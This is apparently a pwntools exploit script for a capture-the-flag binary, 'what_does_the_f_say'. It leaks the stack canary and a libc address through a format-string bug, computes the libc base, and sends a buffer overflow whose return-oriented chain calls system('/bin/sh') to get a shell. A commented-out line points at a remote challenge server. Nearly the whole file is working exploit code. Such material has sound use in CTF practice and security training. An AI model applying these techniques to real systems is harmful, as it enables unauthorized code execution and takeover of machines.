#!/usr/bin/python3

import re
from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_payload, fmtstr_split
from time import sleep

elf 				= context.binary = ELF('./what_does_the_f_say', checksec = False)
# libc 				= ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec = False)
libc = elf.libc
# ld				    = ELF('/lib64/ld-linux-x86-64.so.2', checksec = False)

context.terminal = ['tmux', 'splitw', '-h', '-p', '60', '-I']
context.log_level = "DEBUG"
gdb_debug = False

gs = '''
brva 0x00001499
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug(elf.path, gdbscript=gs)
	else:
		return process([elf.path] + argv, *a, **kw)
		
def find_ip_offset():
	io = start_local(gdb_debug)
	canary = leak_canary()

	payload = flat(
			b"a" * 24,
			p64(canary),
			cyclic(303)	
		)

	overflow(io, payload)
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [{}]".format(ip_offset))
	return ip_offset
	
def generate_payload_aligned(raw_payload, junk, ret):
    payload1 = junk + raw_payload
    if (len(payload1) % 16) == 0:
        return payload1
    
    else:
        payload2 = junk + p64(ret) + raw_payload
        if (len(payload2) % 16) == 0:
            log.info("Payload aligned successfully")
            return payload2
        else:
            log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
            return payload1

#===========================================================
#					EXPLOIT GOES HERE					   #
#===========================================================
# offset = find_ip_offset()
offset = 8

######## REMOTE ########
#io = remote("159.65.51.138", 30768)

######## LOCAL ########
# Leak canary using printf vulnerability in drinks_menu()
def leak_canary(io) -> int:
	io.recv()
	io.sendline(b"1")
	io.recv()
	sleep(1)
	io.sendline(b"2")
	io.recv()
	sleep(1)
	io.sendline(b"%21$p %22$p %23$p %24$p %25$p")
	output = io.recv()
	print(f"Canary output: {output}")
	pattern = r"0x[0-9a-fA-F]{14}00"
	match = re.search(pattern, output.decode('utf-8'))
	if match:
		canary_string = match.group()
		canary_int = int(canary_string, 16)
		print(f"Canary: {canary_string}")
		return canary_int
	else:
		print("Failed to find canary leak")
		exit()

def leak_libc(io, canary) -> int:
	io.sendline(b"1")
	io.recv()
	sleep(1)
	io.sendline(b"2")
	io.recv()
	sleep(1)
	io.sendline(b"%3$p")
	output = io.recvuntil(b"\n")
	print(f"libc output: {output}")

	leaked_libc_string = output.strip()
	leaked_libc_int = int(leaked_libc_string, 16)
	print(f"Libc: {leaked_libc_string}")
	
	puts_plt_offset = elf.plt.puts # offset to read function
	read_got_offset = elf.got.read # got address that points to libc stuff
	read_libc_offset = libc.symbols.read # offset inside libc
	libc_base = (leaked_libc_int - 0xd) - read_libc_offset
	print(f"{hex(libc_base)=}")
	return libc_base 

def overflow(io, payload):
	# Reach less than 20 srocks to get to warning function
	for _ in range(9):
		io.sendline(b"1")
		io.recv()
		io.sendline(b"1")
		io.recv()
	 
	io.sendline(b"1")
	io.recv()
	io.sendline(b"2")
	io.recv()
	io.sendline(b"Red")
	io.recv()

	io.sendline(payload)
	io.interactive()


io = start_local(gdb_debug)

canary = leak_canary(io)
libc_base = leak_libc(io, canary)

libc.address = libc_base

libc_rop = ROP(libc)
pop_rdi_ret = libc_rop.find_gadget(["pop rdi", "ret"])[0]
ret = libc_rop.find_gadget(["ret"])[0]
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
print(f"{hex(ret)=}")
print(f"{hex(pop_rdi_ret)=}")
print(f"{hex(system)=}")
print(f"{hex(binsh)=}")

payload = flat(
	b"a" * 24,
	canary,
	b"f" * 8,
	ret,
	pop_rdi_ret,
	binsh,
	system
)

overflow(io, payload)